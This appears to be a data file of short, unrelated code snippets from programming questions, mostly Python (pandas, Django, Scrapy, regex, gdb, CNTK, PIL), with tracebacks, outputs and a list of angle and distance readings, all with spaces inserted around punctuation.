"def f ( x ) : x = x + 1 z = x + y return z from dis import disdef capture ( f ) : `` '' '' Decorator to capture standard output `` '' '' def captured ( *args , **kwargs ) : import sys from cStringIO import StringIO # setup the environment backup = sys.stdout try : sys.stdout = StringIO ( ) # capture output f ( *args , **kwargs ) out = sys.stdout.getvalue ( ) # release output finally : sys.stdout.close ( ) # close the stream sys.stdout = backup # restore original stdout return out # captured output wrapped in a string return captureddef return_globals ( f ) : `` '' '' Prints all of the global variables in function f `` '' '' x = dis_ ( f ) for i in x.splitlines ( ) : if `` LOAD_GLOBAL '' in i : print idis_ = capture ( dis ) dis_ ( f )"
"> > > import pytz > > > z1 = timezone ( 'America/Edmonton ' ) > > > z2 = timezone ( 'US/Mountain ' ) > > > z1 < DstTzInfo 'America/Edmonton ' LMT-1 day , 16:26:00 STD > > > > z2 < DstTzInfo 'US/Mountain ' MST-1 day , 17:00:00 STD > > > > pytz.VERSION'2012f ' > > > > > > d = datetime.now ( ) > > > ddatetime.datetime ( 2012 , 10 , 9 , 15 , 21 , 41 , 644706 ) > > > d2 = d.replace ( tzinfo=timezone ( 'America/Edmonton ' ) ) > > > d2datetime.datetime ( 2012 , 10 , 9 , 15 , 21 , 41 , 644706 , tzinfo= < DstTzInfo 'America/Edmonton ' LMT-1 day , 16:26:00 STD > ) > > > d2.astimezone ( timezone ( 'US/Eastern ' ) ) datetime.datetime ( 2012 , 10 , 9 , 18 , 55 , 41 , 644706 , tzinfo= < DstTzInfo 'US/Eastern ' EDT-1 day , 20:00:00 DST > )"
import gdbdef event_handler ( event ) : gdb.execute ( `` set scheduler-locking on '' ) # this is needed to avoid parallel exec of the handler gdb.write ( `` \n [ ME ] SIG `` + event.stop_signal ) frame = gdb.selected_frame ( ) while frame : gdb.write ( `` \n [ ME ] FN `` + str ( frame.name ( ) ) ) frame = frame.older ( ) # make sure output goes to a filegdb.execute ( `` set logging on '' ) gdb.execute ( `` set logging file gdbout '' ) gdb.events.stop.connect ( event_handler ) gdb.execute ( `` continue '' ) handle SIGSEGV nostop
"from django_hstore import hstorefrom django.db import modelsclass Item ( VoteModel ) : data = hstore.DictionaryField ( db_index=True ) objects = hstore.HStoreManager ( ) Item.objects.extra ( select= { `` key '' : `` content_item.data - > 'key ' '' } ) .aggregate ( Count ( 'key ' ) ) SELECT content_item.data - > 'key ' AS key , count ( * ) FROM content_item GROUP BY key ; key | count -- -- -- -- -- -+ -- -- -- - value1 | 223 value2 | 28 value3 | 31 ( 3 rows ) Item.objects.extra ( select= { `` key '' : `` content_item.data - > 'key ' '' } ) SELECT ( content_item.data - > 'key ' ) AS `` key '' , `` content_item '' . `` id '' , `` content_item '' . `` data '' FROM `` content_item ''"
"ERROR : Error downloading < GET http : //www.fifa.com/fifa-tournaments/players-coaches/people=44630/index.html > Traceback ( most recent call last ) : File `` /Library/Python/2.7/site-packages/twisted/internet/defer.py '' , line 588 , in _runCallbacks current.result = callback ( current.result , *args , **kw ) File `` /Library/Python/2.7/site-packages/scrapy/core/downloader/__init__.py '' , line 75 , in _deactivate self.active.remove ( request ) KeyError : < GET http : //www.fifa.com/fifa-tournaments/players-coaches/people=44630/index.html > 2016-01-19 15:57:20 [ scrapy ] INFO : Error while removing request from slotTraceback ( most recent call last ) : File `` /Library/Python/2.7/site-packages/twisted/internet/defer.py '' , line 588 , in _runCallbacks current.result = callback ( current.result , *args , **kw ) File `` /Library/Python/2.7/site-packages/scrapy/core/engine.py '' , line 140 , in < lambda > d.addBoth ( lambda _ : slot.remove_request ( request ) ) File `` /Library/Python/2.7/site-packages/scrapy/core/engine.py '' , line 38 , in remove_request self.inprogress.remove ( request ) KeyError : < GET http : //www.fifa.com/fifa-tournaments/players-coaches/people=44630/index.html > scrappy shell http : //www.fifa.com/fifa-tournaments/players-coaches/people=44630/index.html request = Request ( url_nrd , meta = { 'item ' : item } , callback=self.parse_player , dont_filter=True ) def parse_player ( self , response ) : if response.status == 404 : # doing stuff here yield item else : # doing stuff there request = Request ( url_new , meta = { 'item ' : item } , callback=self.parse_more , dont_filter=True ) yield request def parse_more ( self , response ) : # parsing more stuff here return item def parse_player ( self , response ) : if response.status == 404 : # doing stuff here yield item else : paths = sel.xpath ( 'some path extractor here ' ) for path in paths : if ( some_condition ) : # doing stuff there request = Request ( url_new , meta = { 'item ' : item } , callback=self.parse_more , dont_filter=True ) # Bad indent of yield request here ! yield request"
"ColA ColB1 12 32 21 21 32 1 d1 = { 1 : ' a',2 : ' b',3 : ' c ' } d2 = { 1 : 'd',2 : ' e',3 : ' f ' } ColA ColB1 a2 f2 e1 b1 c2 d"
"mydict = { 'level_one ' : { 'level_two ' : { 'test ' : `` Hello World '' } } } def deepGet ( sourceDict , *keys ) : return reduce ( lambda d , k : d.get ( k ) if d else None , keys , sourceDict ) > deepGet ( mydict , * [ 'level_one ' , 'level_two ' , 'test ' ] ) > > Hello World"
"def get_value ( request , param ) : s = get_string ( request , param ) value = re.search ( ' ( \\d\\d\\d\\d ) - ( \\d\\d ) - ( \\d\\d ) ' , s ) if not value : print 'match not found ! ' raise Exception ( 'incorrect format : % s ' % param ) def test_get_value ( self ) : m = test_mocks.HttpRequestMock ( REQUEST = { 'start_date ' : '2011.07.31 ' } ) print '************************* ' print 'date format changed ' self.assertRaises ( Exception , get_value , ( m , 'start_date ' ) ) print '*********************"
"arr = np.array ( [ [ 1. , 1. , 4. , 3. , 6. , 12. , -1. , 1 . ] , [ 1. , 2. , 2. , 2. , 10. , 6. , -2. , 2 . ] , [ 1. , 2. , 3. , 4. , 4. , 11. , -2. , 3 . ] , [ 1. , 2. , 3. , 6. , 8. , 9. , 1. , 4 . ] , [ 1. , 2. , 6. , 7. , 4. , 14. , 1. , 5 . ] , [ 1. , 2. , 7. , 4. , 2. , 17. , -0. , 6 . ] , [ 1. , 3. , 2. , 6. , 7. , 3. , -1. , 7 . ] , [ 1. , 3. , 4. , 1. , 3. , 14. , 0. , 8 . ] , [ 1. , 3. , 5. , 5. , 1. , 16. , -1. , 9 . ] , [ 1. , 3. , 6. , 2. , 9. , 19. , 1. , 10 . ] , [ 1. , 4. , 3. , 1. , 1. , 7. , -1. , 11 . ] , [ 1. , 4. , 4. , 5. , 9. , 10. , 2. , 12 . ] , [ 1. , 4. , 5. , 3. , 6. , 18. , 0. , 13 . ] , [ 1. , 4. , 6. , 6. , 5. , 2. , -1. , 14 . ] , [ 1. , 5. , 1. , 4. , 3. , 5. , 1. , 15 . ] , [ 2. , 1. , 2. , 7. , 2. , 19. , -1. , 16 . ] , [ 2. , 1. , 3. , 2. , 3. , 16. , -2. , 17 . ] ] )"
date home away score_h score_a166 2013-09-01 Fulham Chelsea 0 0167 2013-09-03 Arsenal Everton 0 2164 2013-09-05 Arsenal Swansea 5 1165 2013-09-06 Fulham Norwich 0 1163 2013-09-18 Arsenal Swansea 0 0 grouped = df.groupby ( 'home ' ) grouped = grouped.sort_index ( by='date ' ) # rows inside groups must be in asc order date home away score_h score_ahome Arsenal 167 2013-09-03 Arsenal Everton 0 2 164 2013-09-05 Arsenal Swansea 5 1 163 2013-09-18 Arsenal Swansea 0 0Fulham 166 2013-09-01 Fulham Chelsea 0 0 165 2013-09-06 Fulham Norwich 0 1 date home away score_h score_a rmean_h rmean_ahome Arsenal 167 2013-09-03 Arsenal Everton 0 2 0 2 164 2013-09-05 Arsenal Swansea 5 1 2.5 1.5 163 2013-09-18 Arsenal Swansea 0 0 1.66 1Fulham 166 2013-09-01 Fulham Chelsea 0 0 165 2013-09-06 Fulham Norwich 0 1
< math xmlns= '' http : //www.w3.org/1998/Math/MathML '' > < lambda > < bvar > < ci > A < /ci > < /bvar > < bvar > < ci > B < /ci > < /bvar > < apply > < plus/ > < ci > A < /ci > < ci > B < /ci > < /apply > < /lambda > < /math >
myapp/ app.py myapp/ app.py bootstrap.py buildout.cfg myapp/ bin/ buildout eggs/ setuptools-0.6c12dev_r80622-py2.6.egg tornado-1.0.1-py2.6.egg parts/
"from redis import RedisREDIS_CONNECTION = Redis ( ) from django.conf import settingssettings.REDIS_CONNECTION.lpush ( `` testlist '' , `` hello '' )"
"df1 =pd.DataFrame ( np.random.randn ( 6,4 ) , index=pd.date_range ( ' 1/1/2000 ' , periods=6 , freq='1h ' ) ) df2 =pd.DataFrame ( np.random.randn ( 6,4 ) , index=pd.date_range ( ' 1/2/2000 ' , periods=6 , freq='1h ' ) ) df3 = df1.append ( df2 )"
from django.conf import settings def site_view ( request ) : ... if some_var == settings.MY_SETTING : ... Exception Type : AttributeErrorException Value : 'function ' object has no attribute 'MY_SETTING '
"def my_precision ( x , n ) : fmt = ' { : . % df } ' % n return fmt.format ( x )"
"class B ( A ) : def __init__ ( self ) : A.__init__ ( self ) class B ( A ) : def __init__ ( self ) : super ( B , self ) .__init__ ( ) # or super ( ) .__init__ ( )"
"> > > [ j ( ) for j in [ lambda : i for i in range ( 10 ) ] ] [ 9 , 9 , 9 , 9 , 9 , 9 , 9 , 9 , 9 , 9 ] > > > list ( [ lambda : i for i in range ( 10 ) ] ) [ < function < lambda > at 0xb6f9d1ec > , < function < lambda > at 0xb6f9d22c > , < function < lambda > at 0xb6f9d26c > , < function < lambda > at 0xb6f9d2ac > , < function < lambda > at 0xb6f9d2ec > , < function < lambda > at 0xb6f9d32c > , < function < lambda > at 0xb6f9d36c > , < function < lambda > at 0xb6f9d3ac > , < function < lambda > at 0xb6f9d3ec > , < function < lambda > at 0xb6f9d42c > ] > > > funcs = [ ] ... for i in range ( 10 ) : ... funcs.append ( lambda : i ) ... [ j ( ) for j in funcs ] [ 9 , 9 , 9 , 9 , 9 , 9 , 9 , 9 , 9 , 9 ]"
"my_str = `` foofoofoofoo '' pattern = `` ( foo ) * '' result = re.search ( pattern , my_str ) ( `` foo '' , `` foo '' , `` foo '' , `` foo '' ) my_str= `` Mr foo '' pattern = `` ( Mr ) ? foo '' result = re.search ( pattern , my_str )"
"my-project/ lexer.py exceptions.py class LexError ( Exception ) : def __init__ ( self , message , line ) : self.message = message self.line = line import reimport sysfrom exceptions import LexError ..."
"> > > def treemap ( lst ) : ... for element in lst : ... if element == type ( list ) : ... return treemap ( element ) ... else : ... element=element**2 ... return lst > > > lst = [ 1 , 2 , 3 , [ 4 , [ 5 , 6 ] , 7 ] ] > > > print ( treemap ( lst ) )"
"def getThis ( request ) : def invalidate_data ( getData , 'long_term ' , search_term ) : region_invalidate ( getData , 'long_term ' , search_term ) @ cached_region ( 'long_term ' ) def getData ( search_term ) : return response try : request.matchdict [ 'refresh ' ] except : pass search_term = request.matchdict [ 'searchterm ' ] return getData ( search_term )"
"parser.add_argument ( ' -- end_datetime ' , dest='end_datetime ' ) known_args , pipeline_args = parser.parse_known_args ( argv ) query = < redacted SQL String with a placeholder for a date > query = query.replace ( ' # ENDDATETIME # ' , known_args.end_datetime ) with beam.Pipeline ( options=pipeline_options ) as p : rows = p | 'read query ' > > beam.io.Read ( beam.io.BigQuerySource ( query=query , use_standard_sql=True ) )"
"projects = [ { 'name ' : 'project alpha ' , 'code ' : 12 , 'active ' : True } , { 'name ' : 'project beta ' , 'code ' : 25 , 'active ' : True } , { 'name ' : 'project charlie ' , 'code ' : 46 , 'active ' : False } ] for project in projects : columns = project.keys ( ) values = project.values ( ) query = `` '' '' INSERT INTO projects ( % s ) VALUES % s ; '' '' '' # print ( cursor.mogrify ( query , ( AsIs ( ' , '.join ( project.keys ( ) ) ) , tuple ( project.values ( ) ) ) ) ) cursor.execute ( query , ( AsIs ( ' , '.join ( columns ) ) , tuple ( values ) ) ) conn.commit ( )"
dOpen dHigh dLow dClose dVolume day_of_week_0 day_of_week_1 ... month_6 month_7 month_8 month_9 month_10 month_11 month_12639 -0.002498 -0.000278 -0.005576 -0.002228 -0.002229 0 0 ... 0 0 1 0 0 0 0640 -0.004174 -0.005275 -0.005607 -0.005583 -0.005584 0 0 ... 0 0 1 0 0 0 0641 -0.002235 0.003070 0.004511 0.008984 0.008984 1 0 ... 0 0 1 0 0 0 0642 0.006161 -0.000278 -0.000281 -0.001948 -0.001948 0 1 ... 0 0 1 0 0 0 0643 -0.002505 0.001113 0.005053 0.002788 0.002788 0 0 ... 0 0 1 0 0 0 0644 0.004185 0.000556 -0.000559 -0.001668 -0.001668 0 0 ... 0 0 1 0 0 0 0645 0.002779 0.003056 0.003913 0.001114 0.001114 0 0 ... 0 0 1 0 0 0 0646 0.000277 0.004155 -0.002227 -0.002782 -0.002782 1 0 ... 0 0 1 0 0 0 0647 -0.005540 -0.007448 -0.003348 0.001953 0.001953 0 1 ... 0 0 1 0 0 0 0648 0.001393 -0.000278 0.001960 -0.003619 -0.003619 0 0 ... 0 0 1 0 0 0 0
GetYouTubeVideoEntry ( video_id=youtube_video_id_to_output )
import `` crypto/des '' des.NewCipher ( [ ] byte ( `` abcdefgh '' ) )
"import sysimport timeitdef is_unique_chars_bit ( my_str ) : checker = 0 for char in my_str : val = ord ( char ) - ord ( ' a ' ) if ( ( checker & ( 1 < < val ) ) > 0 ) : return False checker |= ( 1 < < val ) return Truedef is_unique_chars_list ( my_str ) : if len ( my_str ) > 128 : # Supposing we use ASCII , which only has 128 chars return False char_list = [ False ] * 128 for char in my_str : val = ord ( char ) if char_list [ val ] : return False char_list [ val ] = True return Trueif __name__ == '__main__ ' : alphabet = `` abcdefghijklmnopqrstuvwxyz '' t_bit = timeit.Timer ( `` is_unique_chars_bit ( ' '' + alphabet + '' ' ) '' , `` from __main__ import is_unique_chars_bit '' ) t_list = timeit.Timer ( `` is_unique_chars_list ( ' '' + alphabet + '' ' ) '' , `` from __main__ import is_unique_chars_list '' ) print ( t_bit.repeat ( 3 , 200000 ) ) print ( t_list.repeat ( 3 , 200000 ) ) [ 1.732477278999795 , 1.7263494359995093 , 1.7404333820004467 ] [ 0.6785205180003686 , 0.6759967380003218 , 0.675434408000001 ] boolean isUniqueCharsBoolArray ( String str ) { if ( str.length ( ) > 128 ) return false ; boolean [ ] char_set = new boolean [ 128 ] ; for ( int i = 0 ; i < str.length ( ) ; i++ ) { int val = str.charAt ( i ) ; if ( char_set [ val ] ) { return false ; } char_set [ val ] = true ; } return true ; } boolean isUniqueCharsBits ( String str ) { for ( int i = 0 ; i < str.length ( ) ; i++ ) { int val = str.charAt ( i ) - ' a ' ; if ( ( checker & ( 1 < < val ) ) > 0 ) { return false ; } checker |= ( 1 < < val ) ; } return true ; }"
"sqlalchemy.exc.OperationalError : ( pymysql.err.OperationalError ) ( 1045 , `` Access denied for user … ( Background on this error at : http : //sqlalche.me/e/e3q8 ) sqlalchemy.exc.OperationalError : ( pymysql.err.OperationalError ) ( 2003 , `` Ca n't connect to MySQL server on 'localhost ' ( [ Errno 111 ] Connection refused ) '' ) ( Background on this error at : http : //sqlalche.me/e/e3q8 ) try : engine.scalar ( select ( [ 1 ] ) ) except sqlalchemy.exc.OperationalError as err : if err_______ : print ( `` Access Denied '' ) elifif err_______ : print ( `` Connection Refused '' ) else : raise"
"class Book ( models.Model ) : title = models.CharField ( max_length=255 ) genre = models.CharField ( max_length=63 ) author = models.ForeignKey ( Author ) date_published = models.DateField ( ) class BlogPost ( models.Model ) : author = models.ForeignKey ( Author ) date_published = models.DateField ( ) WITH ordered AS ( SELECT blog_post.id , book.title , ROW_NUMBER ( ) OVER ( PARTITION BY blog_post.id ORDER BY book.date_published ) AS rn FROM blog_post LEFT JOIN book ON book.author_id = blog_post.author_id AND book.genre = 'mystery ' AND book.date_published > = blog_post.date_published ) SELECT id , title FROM ordered WHERE rn = 1 ; books = models.Book.objects.filter ( ... ) .select_related ( ... ) .prefetch_related ( ... ) annotated_books = books.annotate ( most_recent_title= ... ) published_after = Q ( author__book__date_published__gte=F ( 'date_published ' ) , author__book__genre='mystery ' )"
"# -- ! -coding : utf-8from rest_framework import serializersfrom snippets.models import Snippetfrom django.contrib.auth.models import Userclass SnippetSerializer ( serializers.ModelSerializer ) : owner = serializers.ReadOnlyField ( source='owner.username ' ) class Meta : model = Snippet fields = ( 'id ' , 'title ' , 'code ' , 'linenos ' , 'language ' , 'style ' , 'owner ' ) class UserSerializer ( serializers.ModelSerializer ) : snippets = serializers.PrimaryKeyRelatedField ( many=True , queryset=Snippet.objects.all ( ) ) class Meta : model = User fields = ( 'id ' , 'username ' , 'snippets ' ) class UserList ( generics.ListAPIView ) : queryset = User.objects.all ( ) serializer_class = UserSerializerclass UserDetail ( generics.RetrieveAPIView ) : queryset = User.objects.all ( ) serializer_class = UserSerializer AttributeError at /users/'User ' object has no attribute 'snippets ' class Snippet ( models.Model ) : created = models.DateTimeField ( auto_now_add=True ) title = models.CharField ( max_length=100 , blank = True , default= '' ) code = models.TextField ( ) linenos = models.BooleanField ( default=False ) language = models.CharField ( choices=LANGUAGE_CHOICES , default='python ' , max_length=100 ) style = models.CharField ( choices=STYLE_CHOICES , default='friendly ' , max_length=100 ) owner = models.ForeignKey ( 'auth.User ' ) highlighted = models.TextField ( ) class Meta : ordering = ( 'created ' , ) def save ( self , *args , **kwargs ) : `` '' '' Usa o a biblioteca pygments para criar um representacao HTML com destaque do snippet `` '' '' lexer = get_lexer_by_name ( self.language ) linenos = self.linenos and 'table ' or False options = self.title and { 'title ' : self.title } or { } formatter = HtmlFormatter ( style=self.style , linenos=linenos , full=True , **options ) self.highlighted = highlight ( self.code , lexer , formatter ) super ( Snippet , self ) .save ( *args , **kwargs )"
"from collections import dequefrom itertools import permutationsfrom .sieve import sieve_of_erastothenes # my own implementation of the Sieve of Erastothenesprimes = deque ( prime for prime in sieve_of_erastothenes ( 10000 ) if prime > 1000 and prime ! = 1487 ) # all four-digit primes except 1487try : while True : prime = primes.popleft ( ) # decrease the length of primes each time to speed up membership test for inc in xrange ( 1,10000 + 1 - ( 2 * prime ) ) : # this limit ensures we do n't end up with results > 10000 inc1 = prime + inc inc2 = prime + 2*inc if inc1 in primes and inc2 in primes : primestr = str ( prime ) perms = set ( `` .join ( tup ) for tup in permutations ( primestr ) ) # because permutations ( ) returns tuples inc1str = str ( inc1 ) inc2str = str ( inc2 ) if inc1str in perms and inc2str in perms : print primestr + inc1str + inc2str raise IOError # I chose IOError because it 's unlikely to be raised # by anything else in the block . Exceptions are an easy # way to break out of nested loops.except IOError : pass $ time python `` problem49-deque.py '' 296962999629real 1m3.429suser 0m49.779ssys 0m0.335s $ time pypy-c `` problem49-deque.py '' 296962999629real 5m52.736suser 5m15.608ssys 0m1.509s"
"class Tasks ( db.DynamicDocument ) : task_id = db.UUIDField ( primary_key=True , default=uuid.uuid4 ) name = db.StringField ( ) flag = db.IntField ( ) class UserTasks ( db.DynamicDocument ) : user_id = db.ReferenceField ( 'User ' ) tasks = db.ListField ( db.ReferenceField ( 'Tasks ' ) , default=list ) obj = UserTasks.objects.get ( user_id=user_id , tasks=task_id ) task_list = obj.tasksfor t in task_list : if t [ 'task_id ' ] == task_id : print t [ 'flag ' ]"
"input = input_variable ( input_dim ) label = input_variable ( num_output_classes ) h = Recurrence ( LSTM ( lstm_dim ) ) ( input ) final_output = C.sequence.last ( h ) z = Dense ( num_output_classes ) ( final_output ) loss = C.cross_entropy_with_softmax ( z , label ) return cross_entropy_with_softmax ( output_vector , target_vector , axis , name ) RuntimeError : Currently if an operand of a elementwise operation has any dynamic axes , those must match the dynamic axes of the other operands label = input_variable ( num_output_classes , dynamic_axes= [ C.Axis.default_batch_axis ( ) ] ) tf = np.split ( training_features , num_minibatches ) tl = np.split ( training_labels , num_minibatches ) for i in range ( num_minibatches*num_passes ) : # multiply by the features = np.ascontiguousarray ( tf [ i % num_minibatches ] ) labels = np.ascontiguousarray ( tl [ i % num_minibatches ] ) # Specify the mapping of input variables in the model to actual minibatch data to be trained with trainer.train_minibatch ( { input : features , label : labels } ) File `` C : \Users\Dev\Anaconda3\envs\cntk-py34\lib\site-packages\cntk\cntk_py.py '' , line 1745 , in train_minibatch return _cntk_py.Trainer_train_minibatch ( self , *args ) RuntimeError : Node '__v2libuid__Plus561__v2libname__Plus552 ' ( Plus operation ) : DataFor : FrameRange 's dynamic axis is inconsistent with matrix : { numTimeSteps:1 , numParallelSequences:100 , sequences : [ { seqId:0 , s:0 , begin:0 , end:1 } , { seqId:1 , s:1 , begin:0 , end:1 } , { seqId:2 , s:2 , begin:0 , end:1 } , { seqId:3 , s:3 , begin:0 , end:1 } , { seq ..."
"^ ( , | ; ) { ,2 } ( [ ^ , ; ] + ( , | ; ) { ,2 } ) * $ > > > r.match ( `` ) < _sre.SRE_Match object at 0x7f23af8407e8 > > > > r.match ( 'foo , ' ) < _sre.SRE_Match object at 0x7f23af840750 > > > > r.match ( 'foo , a ' ) < _sre.SRE_Match object at 0x7f23af8407e8 > > > > r.match ( 'foo , , ' ) < _sre.SRE_Match object at 0x7f23af840750 > > > > r.match ( 'foo , , ,a ' ) < _sre.SRE_Match object at 0x7f23af8407e8 > > > > r.match ( 'foo , , , , ' ) > > > r.match ( 'foo , , , , ; ' ) > > > r.match ( 'foo , , , ; ; ' ) < _sre.SRE_Match object at 0x7f23af840750 > > > > r.match ( 'foo , bar , baz , , foo ' ) < _sre.SRE_Match object at 0x7f23af8407e8 > > > > r.match ( 'foo , bar , baz , , fooooo , baaaaar ' ) < _sre.SRE_Match object at 0x7f23af840750 > > > > r.match ( 'foo , bar , baz , , fooooo , baaaaar , ' ) < _sre.SRE_Match object at 0x7f23af8407e8 > > > > r.match ( 'foo , bar , baz , , fooooo , baaaaar , , ' ) < _sre.SRE_Match object at 0x7f23af840750 > > > > r.match ( 'foo , bar , baz , , fooooo , baaaaar , , , ' ) > > > r.match ( 'foo , bar , baz , , fooooo , baaaaar , , , , ' ) > > > r.match ( 'foo , bar , baz , , fooooo , baaaaar , baaaaaaz , , , , ' )"
{ % blocktrans % } You have { { num_messages } } messages . Another sentence . { % blocktrans % }
"class ViewsTest ( TestCase ) : @ mock.patch ( 'extras.utils.get_user_category ' ) def test_select_test ( self , mock_method ) : mock_method.return_value = Category ( id=1 , name= '' Foo '' ) response = self.client.post ( reverse ( 'select_test ' , args= [ 'Foo ' ] ) ) self.assertEqual ( 200 , self.client.post ( reverse ( 'select ' ) ) .status_code ) @ mock.patch ( 'user_profile.models.Profile.categories ' ) def test_category_view ( self , mock_related ) : mock_related.all.return_value = [ ] self.assertEqual ( 200 , self.client.post ( reverse ( 'category ' ) ) .status_code )"
"from django.core.servers.fastcgi import runfastcgi Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > ImportError : No module named 'django.core.servers.fastcgi ' [ `` , '/home/wrapupne/venv/lib/python35.zip ' , '/home/wrapupne/venv/lib/python3.5 ' , '/home/wrapupne/venv/lib/python3.5/plat-linux ' , '/home/wrapupne/venv/lib/python3.5/lib-dynload ' , '/usr/local/lib/python3.5 ' , '/usr/local/lib/python3.5/plat-linux ' , '/home/wrapupne/venv/lib/python3.5/site-packages ' ]"
"def cleanString ( self , s ) : if isinstance ( s , str ) : s = unicode ( s , '' iso-8859-1 '' , '' replace '' ) s=unicodedata.normalize ( 'NFD ' , s ) return s.encode ( 'ascii ' , 'ignore ' ) s = line.replace ( `` \^L '' , '' '' )"
"In [ 10 ] : month_seriesOut [ 10 ] : 2016-01-01 48802016-02-01 45792016-03-01 67262016-04-01 17782016-05-01 33032016-06-01 54022016-07-01 12072016-08-01 61762016-09-01 55862016-10-01 28022016-11-01 69442016-12-01 35802017-01-01 9336dtype : int64 In [ 11 ] : month_series.plot ( kind='bar ' ) Out [ 11 ] : In [ 17 ] : plt.bar ( month_sereis.index , month_sereis.values ) Out [ 17 ] : < Container object of 13 artists >"
"def get_centers0 ( X , r ) : N = X.shape [ 0 ] D = X.shape [ 1 ] grid = np.zeros ( [ 0 , D ] ) nearest = near.NearestNeighbors ( radius = r , algorithm = 'auto ' ) while N > 0 : nearest.fit ( X ) x = X [ int ( random ( ) *N ) , : ] _ , del_x = nearest.radius_neighbors ( x ) X = np.delete ( X , del_x [ 0 ] , axis = 0 ) grid = np.vstack ( [ grid , x ] ) N = X.shape [ 0 ] return grid def get_centers1 ( X , r ) : N = X.shape [ 0 ] D = X.shape [ 1 ] grid = np.zeros ( [ 0 , D ] ) nearest = near.NearestNeighbors ( radius = r , algorithm = 'auto ' ) nearest.fit ( X ) graph = nearest.radius_neighbors_graph ( X ) # This method is very slow even before doing any 'pruning ' def get_centers2 ( X , r , k ) : N = X.shape [ 0 ] D = X.shape [ 1 ] k = k grid = np.zeros ( [ 0 , D ] ) nearest = near.NearestNeighbors ( radius = r , algorithm = 'auto ' ) while N > 0 : nearest.fit ( X ) x = X [ np.random.randint ( 0 , N , k ) , : ] # min_dist = near.NearestNeighbors ( ) .fit ( x ) .kneighbors ( x , n_neighbors = 1 , return_distance = True ) min_dist = dist ( x , k , 2 , np.ones ( k ) ) # where dist is a cython compiled function x = x [ min_dist < 0.1 , : ] _ , del_x = nearest.radius_neighbors ( x ) X = np.delete ( X , del_x [ 0 ] , axis = 0 ) grid = np.vstack ( [ grid , x ] ) N = X.shape [ 0 ] return grid N = 50000r = 0.1x1 = np.random.rand ( N ) x2 = np.random.rand ( N ) X = np.vstack ( [ x1 , x2 ] ) .Ttic = time.time ( ) grid0 = get_centers0 ( X , r ) toc = time.time ( ) print 'Method 0 : ' + str ( toc - tic ) tic = time.time ( ) get_centers1 ( X , r ) toc = time.time ( ) print 'Method 1 : ' + str ( toc - tic ) tic = time.time ( ) grid2 = get_centers2 ( X , r ) toc = time.time ( ) print 'Method 1 : ' + str ( toc - tic ) Method 0 : 0.840130090714Method 1 : 2.23365592957Method 2 : 0.774812936783"
"import math as mfrom PIL import Image # only used for showing output as imagewidth = 254.0height = 24.0Ro = 40.0img = [ [ 1 for x in range ( int ( width ) ) ] for y in range ( int ( height ) ) ] cir = [ [ 0 for x in range ( int ( Ro * 2 ) ) ] for y in range ( int ( Ro * 2 ) ) ] def shom_im ( img ) : # for showing data as image list_image = [ item for sublist in img for item in sublist ] new_image = Image.new ( `` 1 '' , ( len ( img [ 0 ] ) , len ( img ) ) ) new_image.putdata ( list_image ) new_image.show ( ) increment = m.radians ( 360 / width ) rad = Ro - 0.5for i , row in enumerate ( img ) : hyp = rad - i for j , column in enumerate ( row ) : alpha = j * increment x = m.cos ( alpha ) * hyp + rad y = m.sin ( alpha ) * hyp + rad # put value from original image to its position in new image cir [ int ( round ( y ) ) ] [ int ( round ( x ) ) ] = img [ i ] [ j ] shom_im ( cir ) from PIL import Image # only used for showing output as imagewidth , height = 254 , 24ro = 40img = [ [ ( 0 , 0 , 0 , 1 ) for x in range ( int ( width ) ) ] for y in range ( int ( height ) ) ] cir = [ [ ( 0 , 0 , 0 , 255 ) for x in range ( int ( ro * 2 ) ) ] for y in range ( int ( ro * 2 ) ) ] def shom_im ( img ) : # for showing data as image list_image = [ item for sublist in img for item in sublist ] new_image = Image.new ( `` RGBA '' , ( len ( img [ 0 ] ) , len ( img ) ) ) new_image.putdata ( list_image ) new_image.show ( ) def putpixel ( x0 , y0 ) : global cir cir [ y0 ] [ x0 ] = ( 255 , 255 , 255 , 255 ) def drawcircle ( x0 , y0 , radius ) : x = radius y = 0 err = 0 while ( x > = y ) : putpixel ( x0 + x , y0 + y ) putpixel ( x0 + y , y0 + x ) putpixel ( x0 - y , y0 + x ) putpixel ( x0 - x , y0 + y ) putpixel ( x0 - x , y0 - y ) putpixel ( x0 - y , y0 - x ) putpixel ( x0 + y , y0 - x ) putpixel ( x0 + x , y0 - y ) y += 1 err += 1 + 2 * y if ( 2 * ( err - x ) + 1 > 0 ) : x -= 1 err += 1 - 2 * xfor i , row in enumerate ( img ) : rad = ro - i drawcircle ( int ( ro - 1 ) , int ( ro - 1 ) , rad ) shom_im ( cir )"
"# ( angle , distance ) 0,9420.62,34691.25,33502.5,34103.12,34043.75,34034.37,34645,34415.62,34456.25,34446.87,34557.5,34648.12,34648.75,34779.37,347010,350410.62,350511.25,350511.87,351612.5,352913.12,354113.75,354314.37,355215,355915.62,356516.25,357816.87,359117.5,360718.12,362418.75,363419.37,363020,365120.62,367321.25,367821.87,369722.5,371123.12,372623.75,374424.37,376525,378025.62,379626.25,380926.87,383027.5,386728.12,388128.75,385429.37,375130,368930.62,363731.25,358931.87,402937.5,348350,273453.75,168654.37,165655,163155.62,162156.25,160856.87,160057.5,159558.12,159858.75,159659.37,160460,161160.62,162261.25,164461.87,167365,221265.62,222166.25,103766.87,129967.5,208667.5,13083.12,200283.75,199584.37,199385.62,206186.25,204386.87,204687.5,204089.37,208290,271390.62,224591.25,204693.75,2092102.5,327109.37,1349110,4279110.62,2177111.25,2175111.87,2136113.12,2151113.75,2170114.37,2186123.12,2066123.75,2080124.37,2087125,2110125.62,1778126.25,1732126.87,428127.5,1650128.12,1093128.75,2206129.37,2219130,2243130.62,2276131.25,2317131.87,2319132.5,2305133.12,2276133.75,2253135,2224135.62,2202136.25,2181136.87,2156137.5,2131138.12,2108138.75,2081139.37,2068140,2046140.62,2028141.25,1982141.87,2001142.5,1985143.12,2030152.5,1727153.12,1728153.75,1722154.37,1711155,1700155.62,1691156.25,1683156.87,1672157.5,1666158.12,1655158.75,1645159.37,1637160,1633160.62,1622161.25,1621161.87,1611162.5,1602163.12,1597163.75,1592164.37,1583165,1579165.62,1578166.25,1571166.87,1564167.5,1558168.12,1552168.75,1551169.37,1550170,1545170.62,1543171.25,1540171.87,1537172.5,1529173.12,1527173.75,1527174.37,1524175,1522175.62,1518176.25,1519176.87,1517177.5,1513178.12,1510178.75,1514180,1514180.62,1511181.25,1519181.87,1513182.5,1514183.12,1513183.75,1513184.37,1514185,1518185.62,1517186.25,1519186.87,1517187.5,1526188.12,1522188.75,1526189.37,1527190,1530190.62,1536191.25,1536191.87,1541192.5,1544193.12,1549193.75,1553194.37,1555195,1553195.62,1563196.25,